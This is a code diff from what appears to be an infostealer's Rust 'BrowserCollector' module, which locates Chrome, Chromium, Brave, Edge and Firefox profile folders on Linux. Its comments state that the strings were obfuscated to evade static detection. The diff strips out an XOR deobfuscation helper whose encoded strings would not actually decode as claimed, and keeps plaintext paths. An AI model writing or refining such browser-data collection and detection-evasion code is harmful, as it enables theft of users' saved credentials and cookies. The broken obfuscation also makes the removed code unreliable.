@@ -75,26 +75,11 @@ impl BrowserCollector {
     fn find_browsers() -> Vec<BrowserPath> {
         let mut found = Vec::new();
         
-        // Função helper para deofuscar strings (XOR simples)
-        fn deobf(s: &[u8]) -> String {
-            s.iter().map(|b| b ^ 0x17).map(|b| b as char).collect()
-        }
-        
         #[cfg(target_os = "linux")]
         {
             if let Some(home) = dirs::home_dir() {
                 // Strings construídas em runtime para evitar detecção estática
-                // Cada string é XOR com 0x17
                 let targets = [
-                    (deobf(b"Tyebzr"), deobf(b"5vbasvt.tbbtyr,vyebzr"), true),     // Chrome, .config/google-chrome
-                    (deobf(b"Tyebzvhz"), deobf(b"5vbasvt.vyebzvhz"), true),         // Chromium, .config/chromium
-                    (deobf(b"Oenir"), deobf(b"5vbasvt.OenirFbsgjner.Oenir,Oebdfre"), true), // Brave
-                    (deobf(b"Rqtr"), deobf(b"5vbasvt.zvpebfbsg,rqtr"), true),       // Edge
-                    (deobf(b"Sverfbk"), deobf(b"5zbmvyyn.sverfbk"), false),          // Firefox
-                ];
-                
-                // Fallback para strings diretas se deofuscação falhar
-                let fallback_targets = [
                     ("Chrome", ".config/google-chrome", true),
                     ("Chromium", ".config/chromium", true),
                     ("Brave", ".config/BraveSoftware/Brave-Browser", true),
@@ -104,7 +89,7 @@ impl BrowserCollector {
                     ("Firefox", ".mozilla/firefox", false),
                 ];
                 
-                for (name, rel_path, is_chromium) in fallback_targets {
+                for (name, rel_path, is_chromium) in targets {
                     let p = home.join(rel_path);
                     if p.exists() {
                         found.push(BrowserPath {
